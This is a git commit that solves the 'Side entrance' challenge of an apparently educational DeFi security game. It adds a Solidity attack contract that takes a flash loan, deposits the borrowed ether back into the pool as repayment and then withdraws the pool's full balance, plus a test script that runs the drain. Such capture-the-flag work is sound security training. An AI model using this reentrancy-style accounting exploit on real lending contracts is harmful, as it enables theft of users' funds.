ffe69b53213c3c1e38d1ef312ece9adae25d8e96
dapao <0x449556@skiff.com>
2023-07-25 07:55:46 +0800

    56

---
+++ contracts/player-contracts/AttackSideEntrance.sol
@@ -0,0 +1,35 @@
+// SPDX-License-Identifier: SEE LICENSE IN LICENSE
+pragma solidity ^0.8.0;
+
+import {IFlashLoanEtherReceiver} from "../side-entrance/SideEntranceLenderPool.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
+
+contract AttackSideEntrance is IFlashLoanEtherReceiver {
+    using Address for address;
+    using Address for address payable;
+
+    uint private constant etherInPool = 1000 ether;
+    address private pool;
+
+    constructor(address _pool) {
+        pool = _pool;
+    }
+
+    function callFlashLoan() external {
+        pool.functionCall(
+            abi.encodeWithSignature("flashLoan(uint256)", etherInPool)
+        );
+    }
+
+    function execute() external payable {
+        pool.functionCallWithValue(
+            abi.encodeWithSignature("deposit()"),
+            msg.value
+        );
+    }
+
+    function withdraw() external payable {
+        pool.functionCall(abi.encodeWithSignature("withdraw()"));
+        payable(msg.sender).sendValue(address(this).balance);
+    }
+}
--- test/side-entrance/side-entrance.challenge.js
+++ test/side-entrance/side-entrance.challenge.js
@@ -1,38 +1,68 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
-const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
+const { ethers } = require('hardhat')
+const { expect } = require('chai')
+const { setBalance } = require('@nomicfoundation/hardhat-network-helpers')
 
 describe('[Challenge] Side entrance', function () {
-    let deployer, player;
-    let pool;
+    let deployer, player
+    let pool
 
-    const ETHER_IN_POOL = 1000n * 10n ** 18n;
-    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 18n;
+    const ETHER_IN_POOL = 1000n * 10n ** 18n
+    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 18n
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, player] = await ethers.getSigners();
+        ;[deployer, player] = await ethers.getSigners()
 
         // Deploy pool and fund it
-        pool = await (await ethers.getContractFactory('SideEntranceLenderPool', deployer)).deploy();
-        await pool.deposit({ value: ETHER_IN_POOL });
-        expect(await ethers.provider.getBalance(pool.address)).to.equal(ETHER_IN_POOL);
+        pool = await (
+            await ethers.getContractFactory('SideEntranceLenderPool', deployer)
+        ).deploy()
+        await pool.deposit({ value: ETHER_IN_POOL })
+        expect(await ethers.provider.getBalance(pool.address)).to.equal(
+            ETHER_IN_POOL
+        )
 
         // Player starts with limited ETH in balance
-        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
-        expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);
-
-    });
+        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE)
+        expect(await ethers.provider.getBalance(player.address)).to.eq(
+            PLAYER_INITIAL_ETH_BALANCE
+        )
+    })
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-    });
+        const AttackContractFactory = await ethers.getContractFactory(
+            'AttackSideEntrance',
+            player
+        )
+        const AttackContract = await AttackContractFactory.deploy(pool.address)
+
+        const callFlashLoanTx = {
+            to: AttackContract.address,
+            data: AttackContract.interface.encodeFunctionData('callFlashLoan'),
+            gasLimit: 30000000n
+        }
+
+        const withdrawTx = {
+            to: AttackContract.address,
+            data: AttackContract.interface.encodeFunctionData('withdraw'),
+            gasLimit: 30000000n
+        }
+
+        const txs = [callFlashLoanTx, withdrawTx]
+
+        for (const tx of txs) {
+            await player.sendTransaction(tx)
+        }
+    })
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
         // Player took all ETH from the pool
-        expect(await ethers.provider.getBalance(pool.address)).to.be.equal(0);
-        expect(await ethers.provider.getBalance(player.address)).to.be.gt(ETHER_IN_POOL);
-    });
-});
+        expect(await ethers.provider.getBalance(pool.address)).to.be.equal(0)
+        expect(await ethers.provider.getBalance(player.address)).to.be.gt(
+            ETHER_IN_POOL
+        )
+    })
+})
